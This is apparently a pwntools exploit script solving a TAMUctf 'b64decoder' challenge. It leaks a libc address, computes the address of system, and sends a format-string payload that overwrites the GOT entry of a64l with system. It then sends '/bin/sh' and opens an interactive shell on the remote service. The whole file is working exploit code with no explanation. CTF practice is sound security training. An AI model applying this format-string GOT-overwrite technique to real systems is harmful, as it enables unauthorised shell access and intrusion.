from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./b64decoder"
HOST = "challenges.tamuctf.com"
PORT = 2783 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_a64l = elf.got["a64l"]
plt_system = elf.plt["system"]

libc = ELF('./libc.so.6')
off_a64l = libc.symbols["a64l"]
off_system = libc.symbols["system"]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	conn.recvuntil("(")
	libc_a64l = int(conn.recvuntil(")")[:-1],16)
	libc_base = libc_a64l - off_a64l
	libc_system = libc_base + off_system	
	conn.recvline()
	conn.recvline()	
	payload = p32(got_a64l)
	payload += p32(got_a64l+2)
	payload += fsb(2, 71, libc_system, 8, 2)
	
	conn.sendline(payload)
	conn.recvuntil("decoded:")
	conn.recvline()
	conn.sendline("/bin/sh")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
